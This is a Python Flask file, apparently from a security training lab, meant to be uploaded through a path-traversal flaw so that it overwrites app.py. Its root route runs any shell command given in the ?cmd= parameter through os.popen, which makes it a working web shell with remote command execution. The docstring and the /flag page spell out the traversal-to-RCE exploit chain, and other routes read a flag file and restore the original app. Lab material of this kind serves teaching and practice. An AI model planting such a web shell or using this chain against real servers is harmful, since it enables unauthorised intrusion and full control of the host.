"""
backdoor.py — dropped as app.py via the /traversal endpoint.

Upload command:
  Override Filename: ../app.py   (in the UI)
  File:              backdoor.py

Flask's debug reloader detects app.py changed and restarts automatically.

Routes:
  GET /             — RCE: run any command via ?cmd=
  GET /flag         — display the traversal capture flag
  GET /revert       — restore app_original.py → app.py and auto-reload
"""
import os
import shutil
import threading
import time
from datetime import datetime
from flask import Flask, request

app  = Flask(__name__)
BASE = os.path.dirname(os.path.abspath(__file__))


@app.after_request
def log_request(response):
    path = request.full_path.rstrip("?")
    proto = request.environ.get("SERVER_PROTOCOL", "HTTP/1.1")
    stamp = datetime.now().strftime("%d/%b/%Y %H:%M:%S")
    print(f'[{stamp}] "{request.method} {path} {proto}" {response.status_code} -', flush=True)
    return response


@app.route("/")
def index():
    cmd    = request.args.get("cmd", "systeminfo")
    output = os.popen(cmd).read()
    return (
        f"<pre>"
        f"╔══════════════════════════════════════╗\n"
        f"║        BACKDOOR ACTIVE               ║\n"
        f"║  Path Traversal → RCE confirmed      ║\n"
        f"╚══════════════════════════════════════╝\n\n"
        f"$ {cmd}\n{output}\n"
        f"Visit /flag  to capture your flag.\n"
        f"Visit /revert to restore the original lab.\n"
        f"</pre>"
    )


@app.route("/flag")
def flag():
    flag_path = os.path.join(BASE, "flags", "traversal.txt")
    try:
        with open(flag_path) as f:
            flag_value = f.read().strip()
        return (
            f"<pre>"
            f"╔══════════════════════════════════════╗\n"
            f"║         FLAG CAPTURED                ║\n"
            f"╚══════════════════════════════════════╝\n\n"
            f"  {flag_value}\n\n"
            f"Exploit chain:\n"
            f"  POST /traversal  →  ../app.py overwritten\n"
            f"  Flask reloader   →  backdoor activated\n"
            f"  GET /flag        →  flag read from flags/traversal.txt\n"
            f"</pre>"
        )
    except FileNotFoundError:
        return "<pre>flags/traversal.txt not found — is flags/ in the project root?</pre>", 404


@app.route("/revert")
def revert():
    src = os.path.join(BASE, "app_original.py")
    dst = os.path.join(BASE, "app.py")
    if not os.path.exists(src):
        return (
            "<pre>app_original.py not found.\n"
            "Start the original app.py at least once to create the backup.</pre>"
        ), 404

    def restore_later():
        time.sleep(0.5)
        shutil.copy(src, dst)
        os.utime(dst, None)

    threading.Thread(target=restore_later, daemon=True).start()
    return (
        "<pre>"
        "app.py restore scheduled from app_original.py.\n"
        "Flask reloader is restarting the server now...\n\n"
        "Refresh http://localhost:5000 in a moment to confirm the lab is back.\n"
        "</pre>"
    )


if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=5000)
